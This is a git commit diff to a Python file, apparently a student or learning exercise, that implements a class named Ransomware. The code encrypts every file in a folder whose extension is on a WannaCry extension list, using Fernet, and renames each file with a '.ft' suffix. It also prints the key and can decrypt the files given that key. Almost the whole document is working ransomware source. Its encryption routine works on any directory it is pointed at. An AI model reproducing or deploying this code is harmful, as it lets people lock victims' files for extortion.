4bb0f77e5b4554cb8762d151ad4c6850e163b5b0
josepmdc <jdomingocatafal@gmail.com>
2022-07-16 16:44:52 +0200

    Add abbility to decrypt the files given the key

--- stockolm/main.py
+++ stockolm/main.py
@@ -1,37 +1,85 @@
 import os
 import glob
+import argparse
 from cryptography.fernet import Fernet
+from wannacry_file_extensions import file_extensions
 
-DIR_TO_ENCRYPT = "super_important_data"
 
 def main():
-    extensions = load_file_extensions()
-    generate_test_files(extensions)
-    files = []
+    dir = "super_important_data"
+
+    args = parse_args()
+    print(args)
+
+    if args["generate_test_files"]:
+        generate_test_files(dir, file_extensions)
+    else:
+        key = args["reverse"] if args["reverse"] else Fernet.generate_key()
+        print(key)
+
+        ransomware = Ransomware(dir, key, args["reverse"])
+
+        if args["reverse"]:
+            ransomware.dencrypt_files()
+        else:
+            ransomware.encrypt_files()
+
+class Ransomware():
+    def __init__(self, dir, key, reverse) -> None:
+        self.key = key
+        try:
+            self.fernet = Fernet(self.key)
+        except ValueError as e:
+            print(f"Invalid key: {e}")
+        self.files = self.get_file_names(dir, reverse)
+
+    def encrypt_files(self):
+        for file in self.files:
+            with open(file, "rb+") as f:
+                data = self.fernet.encrypt(f.read())
+                f.seek(0)
+                f.write(data)
+                f.truncate()
+            os.rename(file, file + ".ft")
+
+    def dencrypt_files(self):
+        print(self.files)
+        for file in self.files:
+            with open(file, "rb+") as f:
+                data = self.fernet.decrypt(f.read())
+                print("data: ", data)
+                f.seek(0)
+                f.write(data)
+                f.truncate()
+            os.rename(file, os.path.splitext(file)[0])
+
+    def get_file_names(self, dir, reverse):
+        if reverse:
+            return glob.glob(f"{dir}/*.ft")
+
+        files = []
+        for ext in file_extensions:
+            files.extend(glob.glob(f"{dir}/*.{ext}"))
+        return files
+
+def generate_test_files(dir, extensions):
+    os.makedirs(os.path.dirname(dir + "/"), exist_ok=True)
     for ext in extensions:
-        files.extend(glob.glob(f"{DIR_TO_ENCRYPT}/*.{ext}"))
+        path = f"{dir}/encrypt_me_daddy.{ext}"
+        with open(path, 'w+') as f: 
+            f.write("TOP SECRET")
 
-    key = Fernet.generate_key()
-    fernet = Fernet(key)
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+            '-gtf', '--generate-test-files', default=False,
+            action=argparse.BooleanOptionalAction,
+            help='Generate a file for each valid file extensions')
 
-    for file in files:
-        with open(file, "rb+") as f:
-            data = fernet.encrypt(f.read())
-            f.seek(0)
-            f.write(data)
-            f.truncate()
+    parser.add_argument("--reverse", help="This option followed by the key will decrypt de files")
 
-def load_file_extensions():
-    with open("wannacry_file_extensions.txt") as f:
-        return f.read().splitlines()
-
-def generate_test_files(extensions):
-    os.makedirs(os.path.dirname(DIR_TO_ENCRYPT + "/"), exist_ok=True)
-    for ext in extensions:
-        if not os.path.exists('/tmp/test'):
-            path = f"{DIR_TO_ENCRYPT}/encrypt_me_daddy.{ext}"
-            with open(path, 'w+') as f:
-                f.write("TOP SECRET")
+    args = parser.parse_args()
+    return vars(args)
 
 if __name__ == "__main__":
     main()
